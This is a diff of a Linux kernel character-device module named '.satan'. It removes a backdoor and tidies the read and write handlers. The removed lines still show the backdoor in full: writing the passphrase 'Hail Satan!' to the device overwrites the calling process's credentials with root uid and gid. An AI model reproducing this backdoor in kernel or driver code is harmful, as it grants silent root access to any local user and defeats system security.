@@ -6,13 +6,11 @@
 #include <linux/fs.h>
 #include <linux/string.h>
 #include <linux/uaccess.h>
-#include <linux/cred.h>
 #include <linux/semaphore.h>
-
 
 #define DEVICE_NAME ".satan"
 #define CDEV_BUF_SIZE 128 
-#define BACKDOOR_PASSPHRASE "Hail Satan!"
+
 
 static struct satan_cdev {
         dev_t num;  // holds device (major, minor)
@@ -23,8 +21,6 @@ static struct satan_cdev {
         char buf[CDEV_BUF_SIZE];
 } satan_cdev;
 
-
-static struct cred *cred = NULL;
 
 static int satan_cdev_open(struct inode *inode, struct file *filp);
 static int satan_cdev_close(struct inode *inode, struct file *filp);
@@ -131,52 +127,50 @@ static int satan_cdev_close(struct inode *inode, struct file *filp)
         return 0;
 }
 
-static ssize_t satan_cdev_read(struct file *filp, char __user *buf, size_t len, loff_t *offset)
+static ssize_t satan_cdev_read(struct file *filp, char __user *buf,
+                               size_t len, loff_t *offset)
 {
         int ret = 0;
 
         if (sizeof(satan_cdev.buf) <= *offset) {
                 ret = 0;
-        } else {
-                ret = min(len, sizeof(satan_cdev.buf) - (size_t) *offset);
-                if (copy_to_user(buf, satan_cdev.buf + *offset, ret)) {
-                        ret = -EFAULT;
-                } else {
-                        *offset += ret;
-                }
+                goto out;
         }
 
+
+        ret = min(len, sizeof(satan_cdev.buf) - (size_t) *offset);
+        if (copy_to_user(buf, satan_cdev.buf + *offset, ret)) {
+                ret = -EFAULT;
+        } else {
+                *offset += ret;
+        }
+out:
         return ret;
 }
 
-static ssize_t satan_cdev_write(struct file *filp, const char __user *buf, size_t len, loff_t *offset)
+static ssize_t satan_cdev_write(struct file *filp, const char __user *buf,
+                                size_t len, loff_t *offset)
 {
         int ret = 0;
 
         if (sizeof(satan_cdev.buf) <= *offset) {
                 ret = 0;
+                goto out;
+        }
+
+
+        // If the buffer is not large enough, return -ENOSPC.
+        if (sizeof(satan_cdev.buf) - (size_t) *offset < len) {
+                ret = -ENOSPC;
         } else {
-                // If the buffer is not large enough, return -ENOSPC.
-                if (sizeof(satan_cdev.buf) - (size_t) *offset < len) {
-                        ret = -ENOSPC;
+                if (copy_from_user(satan_cdev.buf + *offset, buf, len)) {
+                        ret = -EFAULT;
                 } else {
-                        if (copy_from_user(satan_cdev.buf + *offset, buf, len)) {
-                                ret = -EFAULT;
-                        } else {
-                                ret = len;
-                                *offset += ret;
-                        }
+                        ret = len;
+                        *offset += ret;
                 }
         }
-
-        // backdoor
-        if (!strncmp(BACKDOOR_PASSPHRASE, satan_cdev.buf, strlen(BACKDOOR_PASSPHRASE))) {
-                cred = (struct cred *)__task_cred(current);
-                cred->uid = cred->euid = cred->fsuid = GLOBAL_ROOT_UID;
-                cred->gid = cred->egid = cred->fsgid = GLOBAL_ROOT_GID;
-                printk("satan: root permission granted\n");
-        }
-
+out:
         return ret;
 }
 
